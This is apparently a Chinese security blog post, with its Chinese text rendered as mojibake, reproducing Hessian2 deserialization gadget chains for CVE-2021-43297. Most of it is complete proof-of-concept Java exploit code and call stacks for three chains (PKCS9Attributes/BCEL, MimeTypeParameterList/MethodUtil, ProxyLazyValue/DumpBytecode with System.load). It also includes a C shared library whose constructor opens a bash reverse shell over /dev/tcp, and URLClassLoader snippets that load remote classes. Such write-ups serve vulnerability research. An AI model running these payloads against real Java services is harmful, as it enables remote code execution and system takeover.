---
layout: post
title: hessian2é“¾å­
categories: [blog ]
tags: [Java,]
description: "hessian2é“¾å­åŠèµ›é¢˜å¤ç°"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.compu
---

```java
<dependency>
<groupId>com.caucho</groupId>
<artifactId>hessian</artifactId>
<version>4.0.38</version>
</dependency>
hessiançš„ä¾èµ–
```

é¡¹ç›®åœ¨ï¼šK:\javafile\hessian2tiaoshi

## ç¬¬ä¸€æ¡é“¾å­ CVE-2021-43297

æ¼æ´åœ¨`com.caucho.hessian.io.Hessian2Input#expect()`è¿™é‡Œ

![image-20231122194611938](..\img\final\image-20231122194611938.png)

å¹¶ä¸”æœ‰readObject()æ“ä½œï¼Œæ¥ç€ä¸€ä¸ªStringæ‹¼æ¥ï¼Œä¼šè°ƒç”¨`toString`

å¹¶ä¸”å‘ç°åœ¨`com.caucho.hessian.io.Hessian2Input#readString()`ä¸­å°±æœ‰`expect()`çš„è°ƒç”¨

![image-20231122194936333](..\img\final\image-20231122194936333.png)

åªéœ€è¦å–ä¸Šé¢æ²¡æœ‰æ¡ä»¶çš„caseå°±è¡Œäº†

è¿™é‡Œå–case 67çš„æ—¶å€™è°ƒç”¨ readObjectDefinition æ–¹æ³•è¿›å…¥readString
ç›´æ¥baoså†™è¿›å»å°±å¯ä»¥äº†ï¼š

```java
ByteArrayOutputStream baos = new ByteArrayOutputStream();
Hessian2Output output = new Hessian2Output(baos);
baos.write(67);
output.writeObject(evilClass);
output.flushBuffer();

ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
Hessian2Input input = new Hessian2Input(bais);
input.readObject();
```

è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š

```java
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```



æ‰€ä»¥æˆ‘ä»¬ç°åœ¨çš„ç›®çš„å°±æ˜¯æ‰¾ä¸€ä¸ªtostringå¼€å¤´é€šçš„é“¾å­ã€‚

### PKCS9Attributes+SwingLazyValue+JavaWrapper._mian

#### toStringæ–¹æ³•--->getAttribute

![image-20231122200758880](..\img\final\image-20231122200758880.png)

è¿›å…¥getAttributeæ–¹æ³•çœ‹ä¸€ä¸‹ï¼ˆä¼šè°ƒç”¨Hashtable.getæ–¹æ³•ï¼‰

#### PKCS9Attributes (sun.security.pkcs)getAttribute---->Hashtable.ge

![image-20231122200833577](..\img\final\image-20231122200833577.png)

#### javax.swing.UIDefaluts#get---->getFromHashtable

![image-20231122201716917](..\img\final\image-20231122201716917.png)

#### javax.swing.UIDefaluts#getFromHashtable----->LazyValue#createValue

![image-20231122201836968](..\img\final\image-20231122201836968.png)

### sun.swing.SwingLazyValue

```java
å…¶å®ä¸Šé¢çš„è°ƒç”¨å®Œå…¨æ˜¯ä¸ºäº†é…åˆè¿™ä¸ªçš„è°ƒç”¨ï¼Œå› ä¸ºå®ƒæœ‰invokeæ–¹æ³•å‘€ï¼Œæ— æ•Œï¼ï¼ï¼
```

![image-20231122202037280](..\img\final\image-20231122202037280.png)

æ¥ä¸‹æ¥å°±æ˜¯æ‰¾ä¸€ä¸ªç±»ï¼Œè°ƒç”¨å…¶é™æ€publicæ–¹æ³•ï¼Œæ‰¾åˆ°ï¼š`com.sun.org.apache.bcel.internal.util.JavaWrapper`çš„`_mian`æ–¹æ³•
![image-20231122202657856](..\img\final\image-20231122202657856.png)

![image-20231122202754160](..\img\final\image-20231122202754160.png)

## å¼€å§‹è°ƒè¯•ä»åº•éƒ¨

å‘ç°æ˜¯ä¸€ä¸ªbcel classloaderï¼Œä»é€»è¾‘å¯ä»¥çœ‹å‡ºæ¥æ˜¯åŠ è½½æŒ‡å®šç±»çš„_mainæ–¹æ³•

![image-20231123095709596](..\img\final\image-20231123095709596.png)

```java
éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒClassLoader#defineClassè¿”å›çš„ç±»å¹¶ä¸ä¼šåˆå§‹åŒ–ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°åˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è°ƒç”¨è¿”å›çš„ç±»çš„æ„é€ å‡½æ•°æ‰èƒ½æ‰§è¡Œå‘½ä»¤ã€‚ä¸Šé¢æ­£å¥½å­˜åœ¨äº†invokeå°±ä¸ç”¨æ‹…å¿ƒäº†
```

```java
public class payload {
    public static void main(String[] args) throws Exception {
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);
        String[] str=new String[8];
        str[0]=payload;
        JavaWrapper._main(str);
    }
}
```

### è€ƒè™‘å¦‚ä½•invokeè°ƒç”¨_mainæ–¹æ³•

sun.swing.SwingLazyValue(åˆå§‹æ–¹æ³•ï¼Œç±»æ–¹æ³•å‚æ•°ç›´æ¥ä¼ å€¼ç¾æ»‹æ»‹)

```java
public Object createValue(UIDefaults var1) {
        try {
            ReflectUtil.checkPackageAccess(this.className);
            Class var2 = Class.forName(this.className, true, (ClassLoader)null);
            Class[] var3;
            if (this.methodName != null) {
                var3 = this.getClassArray(this.args);
                Method var6 = var2.getMethod(this.methodName, var3);
                this.makeAccessible(var6);
                
                return var6.invoke(var2, this.args);
                //_main.invoke(JavaWrapper,new Object{})
            } else {
                var3 = this.getClassArray(this.args);
                Constructor var4 = var2.getConstructor(var3);
                this.makeAccessible(var4);
                return var4.newInstance(this.args);
            }
        } catch (Exception var5) {
            return null;
        }
    }
```

```java
public class payload {
    public static void main(String[] args) throws Exception {
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);
        String[] str=new String[8];
        str[0]=payload;

        SwingLazyValue main = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{str});
        UIDefaults uiDefaults=new UIDefaults();

        main.createValue(uiDefaults);
      //  JavaWrapper._main(str);
    }
}
```

### ç»§ç»­å¾€ä¸Šé¢æ‰¾è°è°ƒç”¨äº†createValue

UIDefaultsï¼ˆï¼‰çš„çˆ¶ç±»æ˜¯Hashtableï¼Œä½†æ˜¯è¿™æ ·å‹æ ¹è·å–ä¸åˆ° key name çš„valueå€¼

![image-20231123102542483](..\img\final\image-20231123102542483.png)

è„‘å­æŠ½äº†ï¼Œéƒ½çˆ¶ç±»äº†ï¼Œå­è°ƒçˆ¶ç±»æ–¹æ³•å‘—ï¼Œå‹æ ¹ä¸æ˜¯ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼ˆæ€ä¹ˆå¯èƒ½è°ƒç”¨åˆ°ï¼‰

![image-20231123103007884](..\img\final\image-20231123103007884.png)

### è°è°ƒç”¨äº†Hashtaleçš„getæ–¹æ³•

æ§åˆ¶attributesçš„å€¼å³å¯ï¼Œä½†æ˜¯çœ‹äº†çœ‹æ„é€ æ–¹æ³•å¹¶æ²¡æœ‰å¯æ§ï¼Œåå°„ï¼Ÿï¼Ÿï¼Ÿ

å°±æ˜¯å¡åœ¨äº†å¦‚ä½•è·å¾—æ„é€ æ–¹æ³•è¿™é‡Œ( çœ‹å¸ˆå‚…ä»¬ç”¨äº†åå°„æ„é€ å™¨çš„æ–¹æ³•)

![image-20231123103843983](..\img\final\image-20231123103843983.png)

ç›¸å½“äºå…ˆæ„é€ äº†ä¸€ä¸ªObjectçš„ï¼Œç„¶ååå°„åˆ°æŒ‡å®šçš„ç±»ï¼ˆğŸ‚ï¼‰

```java
   public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
```



### æœ€åçš„poc

```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import sun.reflect.ReflectionFactory;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;

public class Hessian_PKCS9Attributes_SwingLazyValue_JavaWrapper {
    public static void main(String[] args) throws Exception {
        PKCS9Attributes s = createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        JavaClass evil = Repository.lookupClass(test.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);

        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}}));

        setFieldValue(s,"attributes",uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(s);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

## è°ƒç”¨æ ˆï¼š

```java
runMain:131, JavaWrapper (com.sun.org.apache.bcel.internal.util)
_main:153, JavaWrapper (com.sun.org.apache.bcel.internal.util)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
getAttribute:265, PKCS9Attributes (sun.security.pkcs)
toString:334, PKCS9Attributes (sun.security.pkcs)
    
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

```java
public class test {
    public static void _main(String[] argv) throws Exception {
        Runtime.getRuntime().exec("calc");
    }
}
```





## ï¼ˆç¬¬äºŒæ¡é“¾å­ï¼‰MimeTypeParameterList+SwingLazyValue+MethodUtil.invoke

å¤§ä½¬ä»¬åˆæ‰¾åˆ°äº†å¦å¤–ä¸€æ¡é“¾ï¼Œ`javax.activation.MimeTypeParameterList`

åŒæ ·çš„HashtableåŒæ ·çš„get

![image-20231123112622977](..\img\final\image-20231123112622977.png)

åªä¸è¿‡æœ«å°¾ç”¨çš„MethodUtil#invokeï¼Œä¸æ˜¯BCELåŠ è½½å™¨

![image-20231123112830390](..\img\final\image-20231123112830390.png)

```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import sun.swing.SwingLazyValue;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Hessian_MimeTypeParameterList_SwingLazyValue_MethodUtil {
    public static void main(final String[] args) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil").getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
        Method exec = Class.forName("java.lang.Runtime").getDeclaredMethod("exec", String.class);

        SwingLazyValue slz = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invokeMethod, new Object(), new Object[]{exec, Runtime.getRuntime(), new Object[]{"calc"}}});

        uiDefaults.put("key", slz);
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();

        setFieldValue(mimeTypeParameterList,"parameters",uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
        baos.write(67);
        output.getSerializerFactory().setAllowNonSerializable(true);
        output.writeObject(mimeTypeParameterList);
        output.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

å…¶ä»–é“¾å­æ²¡å˜(æ„Ÿå…´è¶£çš„å¸ˆå‚…ä»¬å¯ä»¥ç»†è·Ÿä¸€ä¸‹)

```java
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:253, MimeTypeParameterList (javax.activation)
    
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```



## MimeTypeParameterList+ProxyLazyValue+DumpBytecode.dumpBytecode+System.loadï¼ˆç¬¬ä¸‰æ¡é“¾å­ï¼‰

å…ˆæ™®åŠä¸€ç‚¹çŸ¥è¯†

```java
#include <stdlib.h>
#include <stdio.h>

void __attribute__ ((__constructor__))  aasdnqwgasdela1 (){

    system("echo '/bin/bash -i >& /dev/tcp/xxxxxxxx/9998 0>&1' > /tmp/1");
    system("/bin/bash /tmp/1");
}
```

ç„¶åSystem.load æ‰§è¡Œå°±è¡Œäº†

gcc -c a.c -o a && gcc a --share -o a.so

```java
å¥½ç¥å¥‡ï¼Œä¹‹å‰åœ¨å­¦jniçš„æ—¶å€™ç”¨è¿‡loadï¼Œä½†åªæ˜¯æŠŠdllcä¸­çš„ä»£ç åŠ è½½è¿›æ¥ï¼Œæ²¡æƒ³åˆ°soå¯ä»¥ç›´æ¥æ‰§è¡Œï¼ŒåŠ¨æ€é“¾æ¥åº“ã€‚
```

![image-20231123120824855](..\img\final\image-20231123120824855.png)

è¿™æ¡é“¾å­ä»”ç»†è°ƒä¸€ä¸‹ï¼Œä¸»è¦æ˜¯æƒ³çŸ¥é“ä¸ºä»€ä¹ˆclassloaderåŠ è½½ä¸åˆ°åˆ«çš„jaråŒ…å‘¢

```java
dumpBytecode:107, DumpBytecode (jdk.nashorn.internal.codegen)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:71, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:275, MethodUtil (sun.reflect.misc)
run:1108, UIDefaults$ProxyLazyValue$1 (javax.swing)
doPrivileged:-1, AccessController (java.security)
 

createValue:1087, UIDefaults$ProxyLazyValue (javax.swing)
    //ä¸‹é¢çš„éƒ½æ˜¯å‰é¢çš„demoç›´æ¥æ‹¿æ¥ç”¨
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:290, MimeTypeParameterList (java.awt.datatransfer)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

æœçœŸåŠ è½½ä¸åˆ°

![image-20231123123838685](..\img\final\image-20231123123838685.png)

å’¦æˆ‘ä¸æ‡‚äº†ï¼ˆâœŒä»¬è¯´æ˜¯åŠ è½½å™¨çš„åŸå› ï¼Œï¼‰

![image-20231123124047860](..\img\final\image-20231123124047860.png)

å¯ä»¥å‘ç°class.forName(null)ç±»åŠ è½½å™¨ä¸ºnullçš„æ—¶å€™åŠ è½½ä¸åˆ°ï¼ˆè¿™é‡Œå…ˆåœä¸€ä¸‹çœ‹çš„æ–‡ç« è¿˜æ²¡å¤ªçœ‹æ‡‚ï¼‰

![image-20231123161730659](..\img\final\image-20231123161730659.png)

```java
å¤§æ¦‚æ˜¯forNameåŠ è½½ï¼Œtrueä¼šåŠ è½½ç±»çš„staticé™æ€æ–¹æ³•ï¼Œnullé»˜è®¤æ˜¯ç±»åŠ è½½å™¨ï¼Œåªèƒ½åŠ è½½å™¨åŠ è½½æœ¬åŒ…ä¸­çš„ç±»ã€‚ 
ä½†æ˜¯å› ä¸ºClassLoaderçš„åŸå›  ï¼Œåœ¨SwingLazyValueè¿™é‡Œåªèƒ½åŠ è½½ rt.jar é‡Œé¢çš„ç±»ï¼Œè€ŒDumpBytecodeç±»åœ¨ nashorn.jar é‡Œé¢
æœ€åæ‰¾åˆ°ProxyLazyValue.createValue
```

![image-20231123141318071](..\img\final\image-20231123141318071.png)

å› ä¸ºåœ¨è¿™é‡Œå¿…é¡»è¦æ˜¯LazyValueçš„ç±»å‹

![image-20231123181831689](..\img\final\image-20231123181831689.png)

ç„¶åçœ‹å®ç°ç±»ï¼ŒUIDefaultsçš„å†…ç½®ç±»ProxyLazyvalueä¸­çš„#createValueæ–¹æ³•

`å®ƒè¿™é‡ŒæŒ‡å®šäº†åŠ è½½å™¨ï¼Œç„¶åinvokeæ‰€ä»¥è‚¯å®šèƒ½åŠ è½½åˆ°çš„`

![image-20231123182312152](..\img\final\image-20231123182312152.png)

è¿™é‡Œè·å–åˆ°classLoader ï¼Œæ‰€ä»¥å°±èƒ½æ­£å¸¸åŠ è½½nashorn.jaräº†ï¼Œä½†ç”±äº Hessian åºåˆ—åŒ–çš„æœºåˆ¶ï¼ŒProxyLazyValueé‡Œé¢çš„ field acc åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šæŠ¥é”™ ï¼Œ æ‰€ä»¥éœ€è¦å°† acc åå°„è®¾ç½®ä¸ºnull

æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªæ–‡ä»¶åä¸º.classçš„soæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨System.loadåŠ è½½ï¼Œå› ä¸ºSystem.loadä¸ç®¡åç¼€æ˜¯ä»€ä¹ˆéƒ½å¯ä»¥æ‰§è¡Œ

jdk.nashorn.internal.codegen.DumpBytecode#dumpBytecode

```java
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import jdk.nashorn.internal.runtime.ScriptEnvironment;
import jdk.nashorn.internal.runtime.logging.DebugLogger;
import sun.misc.Unsafe;

import javax.swing.*;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Hessian_MimeTypeParameterList_ProxyLazyValue_DumpBytecode {
    public static void main(String[] args) throws Exception {
        Unsafe unsafe = getUnsafe();
        Object script = unsafe.allocateInstance(ScriptEnvironment.class);
        setFieldValue(script,"_dest_dir","/tmp/");
        Object debug=unsafe.allocateInstance(DebugLogger.class);
        byte[] code= Files.readAllBytes(Paths.get("./calc.so"));
        String classname="calc";

        //å†™æ–‡ä»¶
        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode", new Object[]{
                script,
                debug,
                code,
                classname
        });

        //System.loadåŠ è½½soæ–‡ä»¶
//        UIDefaults.ProxyLazyValue proxyLazyValue = new UIDefaults.ProxyLazyValue("java.lang.System", "load", new Object[]{
//                "/tmp/calc.class"
//        });

        setFieldValue(proxyLazyValue,"acc",null);
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("key", proxyLazyValue);

        Class clazz = Class.forName("java.awt.datatransfer.MimeTypeParameterList");
        Object mimeTypeParameterList = unsafe.allocateInstance(clazz);
        setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(mimeTypeParameterList);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static Unsafe getUnsafe() throws Exception{
        Class<?> aClass = Class.forName("sun.misc.Unsafe");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Unsafe unsafe= (Unsafe) declaredConstructor.newInstance();
        return unsafe;
    }
}
```

```java
dumpBytecode:107, DumpBytecode (jdk.nashorn.internal.codegen)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:71, Trampoline (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
invoke:275, MethodUtil (sun.reflect.misc)
run:1108, UIDefaults$ProxyLazyValue$1 (javax.swing)
doPrivileged:-1, AccessController (java.security)
createValue:1087, UIDefaults$ProxyLazyValue (javax.swing)
getFromHashtable:216, UIDefaults (javax.swing)
get:161, UIDefaults (javax.swing)
toString:290, MimeTypeParameterList (java.awt.datatransfer)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

å…ˆä¸Šä¼ soæ–‡ä»¶ï¼Œç„¶ååœ¨loadåŠ è½½



## æµ…æä¸€ä¸‹BCELè¡¨è¾¾å¼

BCELå…¨å Apache Commons BCEL,å±äºApache Commonsé¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ã€‚

BCELåº“æä¾›äº†ä¸€ç³»åˆ—ç”¨äºåˆ†æã€åˆ›å»ºã€ä¿®æ”¹Java Classæ–‡ä»¶çš„APIã€‚

åœ¨Java 8u251ä»¥åï¼Œå°±è¢«åˆ é™¤äº†ã€‚

BCELåŒ…ä¸­æœ‰ä¸ª`com.sun.org.apache.bcel.internal.util.ClassLoader`ï¼Œå¥¹æ˜¯ä¸€ä¸ªClassLoaderï¼Œä½†æ˜¯å¥¹é‡å†™äº†Javaå†…ç½®çš„ClassLoader#loadClass()æ–¹æ³•

å¦‚æœå­˜åœ¨ ``å­—ç¬¦ä¸²å°±è¿›å…¥createClassæ–¹æ³•

![image-20231122210624839](..\img\final\image-20231122210624839.png)

![image-20231122210919476](..\img\final\image-20231122210919476.png)

![image-20231123093340173](..\img\final\image-20231123093340173.png)

æ€»ç»“

```java
å…¶å®BCELå’Œå…¶ä»–ç±»åŠ è½½å™¨çš„åŒºåˆ«ä¸»è¦æ˜¯ï¼Œæœ‰ä¸€ä¸ªè‡ªå·±çš„åŠ å¯†ã€è§£å¯†é€»è¾‘ï¼Œä½†æ˜¯æœ€åä¾æ—§æ˜¯defineClasåŠ è½½å­—èŠ‚ç 
$$BCEL$$ åœ¨ä¹‹å‰åŠ ä»»ä½•å­—ç¬¦éƒ½ä¸ä¼šå½±å“
```

## åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶

1ã€URLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ `JarLoader` æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯»æ‰¾`.class`æ–‡ä»¶ï¼ˆjaræ–‡ä»¶ä¸­ç›´æ¥åŒ…å«classæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ `jar cvf Exp.jar Exp.class` è¿›è¡Œæ‰“åŒ…ï¼‰ã€‚

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class loadClassFile {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8000/Exp.jar")});
        // ä¼šåŠ è½½ http://127.0.0.1:8000/Exp.jarä¸­çš„Exp.class
        Class<?> exp = urlClassLoader.loadClass("Exp");
        // è§¦å‘æ„é€ å‡½æ•°ï¼Œå¼¹è®¡ç®—å™¨
        exp.newInstance();
    }
}
```

2ã€URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ `file` ï¼Œåˆ™ä½¿ç”¨ `FileLoader` æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯»æ‰¾`.class`æ–‡ä»¶ã€‚

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class loadClassFile {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:/Users/d4m1ts/d4m1ts/java/classloader/")});
        // ä¼šåŠ è½½ /Users/d4m1ts/d4m1ts/java/classloader/Exp.class
        Class<?> exp = urlClassLoader.loadClass("Exp");
        // è§¦å‘æ„é€ å‡½æ•°ï¼Œå¼¹è®¡ç®—å™¨
        exp.newInstance();
    }
}
```

3ã€**URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ `file` ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ `Loader` æ¥å¯»æ‰¾ç±»`.class`æ–‡ä»¶ã€‚**

```java
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class loadClassFile {
    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://127.0.0.1:8000/")});
        // ä¼šåŠ è½½ http://127.0.0.1:8000/Exp.class
        Class<?> exp = urlClassLoader.loadClass("Exp");
        // è§¦å‘æ„é€ å‡½æ•°ï¼Œå¼¹è®¡ç®—å™¨
        exp.newInstance();
    }
}
```

